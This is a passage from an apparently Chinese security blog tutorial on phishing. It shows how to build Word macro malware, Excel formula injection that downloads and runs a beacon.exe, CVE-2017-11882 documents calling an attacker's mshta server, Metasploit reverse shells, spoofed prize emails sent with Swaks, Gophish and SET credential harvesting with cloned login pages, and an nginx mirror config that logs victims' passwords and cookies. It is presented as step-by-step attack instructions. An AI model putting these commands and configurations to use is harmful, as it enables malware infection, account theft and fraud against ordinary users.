src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172007-f61095de-1f02-1.png"></p><h3 id="0x03-Word宏病毒"><a href="#0x03-Word宏病毒" class="headerlink" title="0x03.Word宏病毒"></a><strong>0x03.Word宏病毒</strong></h3><p>宏病毒是Word中被嵌入的带有恶意行为的宏代码（VBA代码），当我们双击打开带有宏病毒的word文档的时候它的宏代码会自动运行。</p><p>步骤一：使用cs生成恶意vba代码</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172829-21845e70-1f04-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172840-27d71380-1f04-1.png"></p><p>步骤二：新建doc文档，创建宏，保存即可</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172906-378785d0-1f04-1.png"></p><p>步骤三：再次打开文件后提示是否启用宏，点击启用就会上线cs</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172929-44ef6c9c-1f04-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172947-4fa4658e-1f04-1.png"></p><h3 id="0x04-Excel注入"><a href="#0x04-Excel注入" class="headerlink" title="0x04.Excel注入"></a><strong>0x04.Excel注入</strong></h3><p>Excel注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开xls文件时，文件会转换为excel格式并提供excel公式的执行功能，从而造成命令执行。</p><p><strong>利用excel注入弹出计算器</strong></p><p>注入代码：<code>=cmd| &#39;/c calc&#39;! &#39;!A1&#39;</code></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173033-6b0ceb16-1f04-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173041-700b042c-1f04-1.png"></p><p><strong>利用excel注入上线cs</strong></p><p>步骤一：使用cs生成exe后门，并放到服务器上</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173056-790edf6c-1f04-1.png"></p><p>步骤二：更换恶意代码</p><p><code>=cmd| &#39;/c curl http://xxx.xxx.xxx.xxx/beacon.exe --output C:\Windows\temp\win.exe &amp;&amp; C:\Windows\temp\win.exe&#39; ! &#39;A1&#39;</code></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173202-a06f2b84-1f04-1.png"></p><p>当双击打开该excel时就会执行恶意代码下载cs后门并运行 ，上线cs</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173211-a5bac094-1f04-1.png"></p><h3 id="0x05-CVE-2017-11882"><a href="#0x05-CVE-2017-11882" class="headerlink" title="0x05.CVE-2017-11882"></a><strong>0x05.CVE-2017-11882</strong></h3><p>cve-2017-11882漏洞也是word钓鱼的一种方式，相比宏病毒更加的隐蔽，把word伪装成某某通知文件，目标点击后就直接可以直接上线。</p><p>利用cve-2017-11882弹出计算器：</p><p>下载poc：<a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></p><p>生成带有病毒的word文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">python2 Command109b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173332-d5d526f2-1f04-1.png"></p><p>双击test.doc，弹出计算器</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173352-e205e7a4-1f04-1.png"></p><p>利用cve-2017-11882上线msf</p><p>步骤一：使用exploit&#x2F;windows&#x2F;misc&#x2F;hta_server生成病毒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">use exploit/windows/misc/hta_server<br>set payload windows/meterpreter/reverse_http<br>set lport 4444<br>show options<br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173413-ee731a70-1f04-1.png"></p><p>步骤二：生成带病毒的doc文件并伪装为通知文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">python2 Command109b_CVE-2017-11882.py -c &quot;mshta http://192.168.126.132:8080/Uf7DGFz.hta&quot; -o 通知文件.doc -i input.rtf<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173510-108ae110-1f05-1.png"></p><p>受害人打开word，msf就会上线shell</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173522-17c2501c-1f05-1.png"></p><h2 id="四、邮件伪造"><a href="#四、邮件伪造" class="headerlink" title="四、邮件伪造"></a><strong>四、邮件伪造</strong></h2><p><strong>Swaks</strong></p><p>Swaks是kali自带的一款邮件伪造工具，通过swaks可以向任意目标发送任意内容的邮件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">swaks的用法：<br>--from &lt;发件人的邮箱&gt; <br>--ehlo &lt;伪造邮件头&gt; <br>--body &lt;邮件正文内容&gt; <br>--header &lt;邮件头信息，subject为邮件标题&gt; <br>--data &lt;源邮件&gt; <br>--attach &lt;附件文件&gt;<br></code></pre></td></tr></table></figure><p>给指定邮箱发送邮件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">swaks --to seyoulala@chacuo.net --from A公司 --ehlo 中奖通知 --body 秉承“正德厚生，臻于至善”的企业核心价值观，立足发展，真情回馈社会和客户。全体员工祝贺您在此活动中获得一等奖。再次感谢您对本公司的关信和支持，本信仅为中奖凭证，具体细节见注意事项。 --header &quot;Subject: 中奖通知&quot;<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173536-1fff73b8-1f05-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173544-246af21a-1f05-1.png"></p><p>现在的邮箱都有某种检测机制，要想他人发邮件，这种方法就不太行了</p><p><strong>Gophish</strong></p><p>Gophish是一个开源的钓鱼工具包，自带web面板，对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用带来的极大的便捷。</p><p>伪造中奖通知邮件，发送附件</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173648-4a9226ca-1f05-1.png"></p><p>效果看着还可以，文件再免杀一下就更好了</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173653-4dbca820-1f05-1.png"></p><p>第二种方法，邮件正文中插入克隆网站</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173704-548695d0-1f05-1.png"></p><p>然后克隆一个qq邮箱的登录页面，引诱其输入账户密码</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173709-57452eda-1f05-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173714-5a42fd06-1f05-1.png"></p><p>如果对方提交输入账户密码就会在gophish中显示出来</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173723-5fe654f6-1f05-1.png"></p><h2 id="五、网站克隆"><a href="#五、网站克隆" class="headerlink" title="五、网站克隆"></a><strong>五、网站克隆</strong></h2><h3 id="0x01、setoolkit"><a href="#0x01、setoolkit" class="headerlink" title="0x01、setoolkit"></a><strong>0x01、setoolkit</strong></h3><p>说到克隆网站，kali上自带的setoolkit给我们提供了很大的方便，不仅可以记录用户提交的数据，还可以进行注入攻击</p><h4 id="setoolkit克隆网站"><a href="#setoolkit克隆网站" class="headerlink" title="setoolkit克隆网站"></a><strong>setoolkit克隆网站</strong></h4><p>1、启动setoolkit，选者1，社工攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">1) Social-Engineering Attacks【社工攻击(常用)】<br>   2) Penetration Testing (Fast-Track)【渗透测试（快速的）】<br>   3) Third Party Modules【第三方模块】<br>   4) Update the Social-Engineer Toolkit【更新社工工具包】<br>   5) Update SET configuration【升级配置】<br>   6) Help, Credits, and About【帮助】<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173833-89992044-1f05-1.png"></p><p>2、随后选择2，web网站式攻击-钓鱼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">1) Spear-Phishing Attack Vectors【鱼叉式网络钓鱼攻击】<br>   2) Website Attack Vectors【web网站式攻击-钓鱼(常用)】<br>   3) Infectious Media Generator【传染性木马】<br>   4) Create a Payload and Listener【创建payload和监听器】<br>   5) Mass Mailer Attack【邮件群发攻击】<br>   6) Arduino-Based Attack Vector【基于安卓的攻击】<br>   7) Wireless Access Point Attack Vector【wifi攻击】<br>   8) QRCode Generator Attack Vector【生成二维码(就普通二维码)】<br>   9) Powershell Attack Vectors【Powershell攻击】<br>  10) Third Party Modules【第三方模块】<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173843-8f5daeb4-1f05-1.png"></p><p>3、选择3，凭证攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">1) Java Applet Attack Method【java小程序攻击】<br>   2) Metasploit Browser Exploit Method【Metasploit浏览器利用】<br>   3) Credential Harvester Attack Method【凭证攻击(常用)】<br>   4) Tabnabbing Attack Method【Tabnabbing攻击】<br>   5) Web Jacking Attack Method【web劫持】<br>   6) Multi-Attack Web Method【web多重攻击】<br>   7) HTA Attack Method【HTA攻击】<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173849-92d00eb6-1f05-1.png"></p><p>4、最后选择2，网站克隆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">1) Web Templates【web模板】<br>   2) Site Cloner【克隆网站】<br>   3) Custom Import【自定义导入】<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173854-9626631c-1f05-1.png"></p><p>5、ip默认即可，最后输入要克隆的站点</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173859-9924632a-1f05-1.png"></p><p>6、访问攻击者的ip就可以看到克隆的站点</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173905-9c4fcc88-1f05-1.png"></p><p>当用户输入账户密码时就会被记录</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173910-9f535742-1f05-1.png"></p><h4 id="setoolkit-HTA注入攻击"><a href="#setoolkit-HTA注入攻击" class="headerlink" title="setoolkit HTA注入攻击"></a><strong>setoolkit HTA注入攻击</strong></h4><p>先使用setoolkit克隆一个站点，当用户点击运行脚本的时候，会触发反弹一个Shell。</p><p>1、启动setoolkit，并选择1，社工攻击</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173945-b4748a42-1f05-1.png"></p><p>2、然后选择2，web网站式攻击-钓鱼</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173950-b756c9be-1f05-1.png"></p><p>3、随后选择7，HTA攻击</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173955-ba0f964a-1f05-1.png"></p><p>4、选择2，克隆网站</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174000-bd651810-1f05-1.png"></p><p>5、输入克隆的站点，监听ip和端口默认就行，最后还需选择一个攻击载荷 Meterpreter Reverse TCP</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174005-c041b9a8-1f05-1.png"></p><p>当攻击者访问攻击机的ip时就会弹出弹窗并且上线shell</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174010-c2e8487a-1f05-1.png"></p><h3 id="0x02、nginx反向代理克隆镜像网站"><a href="#0x02、nginx反向代理克隆镜像网站" class="headerlink" title="0x02、nginx反向代理克隆镜像网站"></a><strong>0x02、nginx反向代理克隆镜像网站</strong></h3><p>nginx有个反向代理功能，将客户端的请求均匀地分配到后端的多个业务服务器进行处理，nginx再将执行结果返回给客户端，以此来解决网站流量过大的问题。</p><p>利用nginx反向代理克隆生成镜像网站就是通过反向代理将请求分发到一个不属于我们的网站去处理，最后将处理的结果再通过nginx返回给用户。</p><p>1、打开nginx配置⽂件&#x2F;www&#x2F;server&#x2F;nginx&#x2F;conf&#x2F;nginx.conf ， 在http处添加以下配置，指定日志的存储内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">log_format Clonelog escape=json &#x27;&#123;$remote_addr|&#x27;<br>    &#x27;$request_filename|&#x27;<br>    &#x27;$request_body|&#x27;<br>    &#x27;$http_cookie|&#x27;<br>    &#x27;$http_x_forwarded_for|&#x27;<br>    &#x27;$time_local&#125;&#x27;;<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174040-d51ee788-1f05-1.png"></p><p>2、在&#x2F;www&#x2F;server&#x2F;panel&#x2F;vhost&#x2F;nginx&#x2F;目录下新增clone.conf，做如下配置，生成镜像网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">server<br>&#123;<br><br>    listen 8000;<br>    server_name 127.0.0.1;<br>    index index.html index.htm index.php;<br>    access_log /www/wwwlogs/access.log Clonelog;<br><br> location / &#123;<br>    proxy_pass http://xxx.xxx.com;<br>    proxy_buffering off;<br>    proxy_set_header X-Real-Ip $remote_addr;<br>    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;<br>    proxy_set_header Host &quot;xxx.xxx.com&quot;;<br>    proxy_set_header Accept-Encoding &quot;&quot;;<br>    proxy_set_header User-Agent $http_user_agent;<br>    proxy_set_header referer &quot;http://xxx.xxx.com$request_uri&quot;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>server_name 监听的域名。</p><p>access_log 设置输出⽇志的路径，最后面是我们配置的日志输出格式 。</p><p>proxy_pass 反向代理的⽹站 。</p><p>proxy_set_header ⽤于在向反向代理的后端 Web 服务器发起请求时 添加指定的 Header头信息。</p><p>access_log 要和上⾯的nginx.conf 配置中的Clonelog 对应不然⽇志 不会起作⽤。</p><p>重点是$request_body (获取post数据)，$http_cookie (获取cookie数据)这就是我们钓⻥的核⼼了。当有⼈访问并登陆我们反向代理的⽹站以 后 我们点开⽇志就可以看到他的cookie和post提交的⽤户名和密码了。</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174053-dcb5b12a-1f05-1.png"></p><p>3、重新加载nginx配置文件，<code>nginx -s reload</code></p><p>4、访问克隆网站，查看效果</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174104-e337c1dc-1f05-1.png"></p><p>4、如果用户提交账户密码，就会被日志文件记录，日志文件位置：&#x2F;www&#x2F;wwwlogs&#x2F;access.log</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174109-e68c90c4-1f05-1.png"></p><h3 id="0x03、前端页面克隆"><a href="#0x03、前端页面克隆" class="headerlink" title="0x03、前端页面克隆"></a><strong>0x03、前端页面克隆</strong></h3><p>先找一个大型网站，带登录界面的那种，用ctrl+s将网站前端代码保存下来，再把后台功能稍加修改，这样我们的钓鱼网站在界面上差不多就可以做到以假乱真了。</p><p>以某宝官网为目标</p><p><img 